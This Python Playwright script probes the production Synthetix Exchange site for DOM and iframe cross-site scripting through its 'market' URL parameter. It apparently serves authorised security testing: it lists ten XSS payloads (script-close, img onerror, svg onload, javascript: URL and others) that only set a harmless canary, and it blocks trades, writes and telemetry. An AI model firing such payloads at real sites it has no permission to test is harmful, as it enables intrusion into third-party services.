#!/usr/bin/env python3
"""GET-only production-browser probe for market-query DOM/iframe injection.

Safety constraints:
- only navigates the in-scope Synthetix Exchange and loads public assets/data;
- blocks every PAPI trade request, private trade WebSocket, telemetry ingestion,
  transaction RPC method, and non-GET third-party write before transmission;
- uses inert canaries that only set a same-page JavaScript variable/data attribute;
- no wallet, account, signature, credential, order, or state mutation.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import urllib.parse
from typing import Any

from playwright.async_api import Browser, BrowserContext, Page, Request, Route, async_playwright

OUT = pathlib.Path("synthetix_market_query_xss")
OUT.mkdir(parents=True, exist_ok=True)
BASE = "https://exchange.synthetix.io/"
TARGET_HOST = "exchange.synthetix.io"
PAPI_HOST = "papi.synthetix.io"
TELEMETRY_PARTS = (
    "sentry.io", "posthog.com", "segment.io", "segment.com", "segmentapis.com",
    "intercom.io", "intercomcdn.com", "dynamicauth.com",
)

PAYLOADS = [
    ("baseline", "BTC-USDT"),
    ("double_quote_img", "BTC-USDT\"><img src=x onerror=globalThis.__SYNTH_XSS_CANARY='img'>"),
    ("iframe_breakout", "BTC-USDT\"></iframe><script>globalThis.__SYNTH_XSS_CANARY='script'</script><iframe src=\""),
    ("single_quote_handler", "BTC-USDT' onload='globalThis.__SYNTH_XSS_CANARY=\"onload\"' x='"),
    ("script_close", "</script><script>globalThis.__SYNTH_XSS_CANARY='close-script'</script>"),
    ("svg_onload", "<svg onload=globalThis.__SYNTH_XSS_CANARY='svg'></svg>"),
    ("javascript_url", "javascript:globalThis.__SYNTH_XSS_CANARY='javascript-url'"),
    ("entity_breakout", "BTC-USDT&quot;&gt;<img src=x onerror=globalThis.__SYNTH_XSS_CANARY='entity'>"),
    ("template_breakout", "${globalThis.__SYNTH_XSS_CANARY='template'}"),
    ("newline_handler", "BTC-USDT\n\" autofocus onfocus=globalThis.__SYNTH_XSS_CANARY='focus' x=\""),
]

INIT = r"""
(() => {
  const audit = {
    canary: null,
    alerts: [],
    errors: [],
    innerHTMLWrites: [],
    insertAdjacentHTMLWrites: [],
    documentWrites: [],
    attributeWrites: [],
  };
  Object.defineProperty(window, '__marketXssAudit', { value: audit, configurable: false });
  Object.defineProperty(window, '__SYNTH_XSS_CANARY', {
    configurable: false,
    get() { return audit.canary; },
    set(v) {
      audit.canary = String(v);
      try { document.documentElement.setAttribute('data-synth-xss-canary', String(v)); } catch (_) {}
    },
  });
  window.alert = (v) => audit.alerts.push(`alert:${String(v)}`);
  window.confirm = (v) => { audit.alerts.push(`confirm:${String(v)}`); return false; };
  window.prompt = (v) => { audit.alerts.push(`prompt:${String(v)}`); return null; };
  window.addEventListener('error', (e) => audit.errors.push(String(e.message || e.error || 'error')));
  window.addEventListener('unhandledrejection', (e) => audit.errors.push(`rejection:${String(e.reason)}`));

  const marker = /SYNTH_XSS_CANARY|onerror|onload|close-script|javascript-url|entity|template/;
  try {
    const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    if (desc && desc.set && desc.get) {
      Object.defineProperty(Element.prototype, 'innerHTML', {
        configurable: true,
        get: desc.get,
        set(value) {
          const text = String(value);
          if (marker.test(text)) audit.innerHTMLWrites.push({ tag: this.tagName, length: text.length, sample: text.slice(0, 500) });
          return desc.set.call(this, value);
        },
      });
    }
  } catch (e) { audit.errors.push(`innerHTML-wrap:${String(e)}`); }

  try {
    const original = Element.prototype.insertAdjacentHTML;
    Element.prototype.insertAdjacentHTML = function(position, value) {
      const text = String(value);
      if (marker.test(text)) audit.insertAdjacentHTMLWrites.push({ tag: this.tagName, position, length: text.length, sample: text.slice(0, 500) });
      return original.call(this, position, value);
    };
  } catch (e) { audit.errors.push(`insertAdjacentHTML-wrap:${String(e)}`); }

  try {
    const original = Document.prototype.write;
    Document.prototype.write = function(...values) {
      const text = values.map(String).join('');
      if (marker.test(text)) audit.documentWrites.push({ length: text.length, sample: text.slice(0, 500) });
      return original.apply(this, values);
    };
  } catch (e) { audit.errors.push(`document-write-wrap:${String(e)}`); }

  try {
    const original = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function(name, value) {
      const text = String(value);
      if (marker.test(text)) audit.attributeWrites.push({ tag: this.tagName, name: String(name), length: text.length, sample: text.slice(0, 500) });
      return original.call(this, name, value);
    };
  } catch (e) { audit.errors.push(`setAttribute-wrap:${String(e)}`); }
})();
"""


def sha(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


async def install_network_guard(page: Page, requests: list[dict[str, Any]]) -> None:
    async def guard(route: Route, request: Request) -> None:
        parsed = urllib.parse.urlparse(request.url)
        host = (parsed.hostname or "").lower()
        method = request.method.upper()
        try:
            post_data = request.post_data or ""
        except Exception:
            post_data = ""
        lower = post_data.lower()
        transaction_rpc = "eth_sendtransaction" in lower or "eth_sendrawtransaction" in lower
        private_ws = parsed.scheme in ("ws", "wss") and host == PAPI_HOST and "/ws/trade" in parsed.path.lower()
        papi_trade = host == PAPI_HOST and parsed.path.lower().endswith("/trade")
        telemetry = any(part in host for part in TELEMETRY_PARTS)
        third_party_write = method != "GET" and host not in (TARGET_HOST, PAPI_HOST)
        blocked = transaction_rpc or private_ws or papi_trade or telemetry or third_party_write
        if blocked or host in (TARGET_HOST, PAPI_HOST) or telemetry:
            requests.append({
                "method": method,
                "host": host,
                "path": parsed.path,
                "resourceType": request.resource_type,
                "blocked": blocked,
                "postDataBytes": len(post_data.encode()),
                "postDataSha256": sha(post_data) if post_data else None,
            })
        if blocked:
            await route.abort("blockedbyclient")
        else:
            await route.continue_()

    await page.route("**/*", guard)


async def snapshot(page: Page, label: str, payload: str, requests: list[dict[str, Any]]) -> dict[str, Any]:
    state = await page.evaluate(
        """() => {
          const audit = window.__marketXssAudit || {};
          const frames = Array.from(document.querySelectorAll('iframe')).map((f) => {
            let body = null;
            try { body = (f.contentDocument && f.contentDocument.documentElement && f.contentDocument.documentElement.outerHTML || '').slice(0, 3000); } catch (_) {}
            return {
              src: f.src || f.getAttribute('src') || '',
              title: f.title || '',
              name: f.name || '',
              sandbox: f.getAttribute('sandbox') || '',
              body,
            };
          });
          return {
            href: location.href,
            canary: audit.canary || null,
            dataAttribute: document.documentElement.getAttribute('data-synth-xss-canary'),
            alerts: audit.alerts || [],
            errors: (audit.errors || []).slice(0, 50),
            innerHTMLWrites: audit.innerHTMLWrites || [],
            insertAdjacentHTMLWrites: audit.insertAdjacentHTMLWrites || [],
            documentWrites: audit.documentWrites || [],
            attributeWrites: audit.attributeWrites || [],
            bodyText: (document.body && document.body.innerText || '').slice(0, 5000),
            bodyHtmlContainsMarker: /SYNTH_XSS_CANARY|close-script|javascript-url/.test(document.documentElement.outerHTML),
            frameCount: frames.length,
            frames,
          };
        }"""
    )
    state.update({
        "label": label,
        "payload": payload,
        "payloadSha256": sha(payload),
        "requests": requests,
    })
    (OUT / f"{label}.json").write_text(json.dumps(state, indent=2), encoding="utf-8")
    try:
        await page.screenshot(path=str(OUT / f"{label}.png"), full_page=True)
    except Exception:
        pass
    return state


async def run_case(browser: Browser, label: str, payload: str) -> dict[str, Any]:
    context: BrowserContext = await browser.new_context(viewport={"width": 1365, "height": 900})
    await context.add_init_script(INIT)
    page = await context.new_page()
    requests: list[dict[str, Any]] = []
    await install_network_guard(page, requests)
    url = BASE + "?" + urllib.parse.urlencode({"market": payload})
    navigation_error = None
    try:
        await page.goto(url, wait_until="domcontentloaded", timeout=90_000)
        await page.wait_for_timeout(15_000)
    except Exception as exc:
        navigation_error = f"{type(exc).__name__}: {exc}"
    state = await snapshot(page, label, payload, requests)
    state["navigationError"] = navigation_error
    (OUT / f"{label}.json").write_text(json.dumps(state, indent=2), encoding="utf-8")
    await context.close()
    return state


async def main() -> None:
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            results = []
            for label, payload in PAYLOADS:
                results.append(await run_case(browser, label, payload))
        finally:
            await browser.close()

    summary = {
        "safety": "GET/public-data browser probe; all writes, PAPI trade, private WS, telemetry, and transaction RPC blocked.",
        "caseCount": len(results),
        "executedCases": [r["label"] for r in results if r.get("canary") or r.get("dataAttribute") or r.get("alerts")],
        "reflectedIntoHtmlSinkCases": [
            r["label"] for r in results
            if r.get("innerHTMLWrites") or r.get("insertAdjacentHTMLWrites") or r.get("documentWrites") or r.get("attributeWrites")
        ],
        "bodyMarkerCases": [r["label"] for r in results if r.get("bodyHtmlContainsMarker")],
        "frameCounts": {r["label"]: r.get("frameCount") for r in results},
        "navigationErrors": {r["label"]: r.get("navigationError") for r in results if r.get("navigationError")},
        "verdict": "DOM_XSS_EXECUTED" if any(r.get("canary") or r.get("dataAttribute") or r.get("alerts") for r in results) else "NO_DOM_XSS_EXECUTION",
    }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
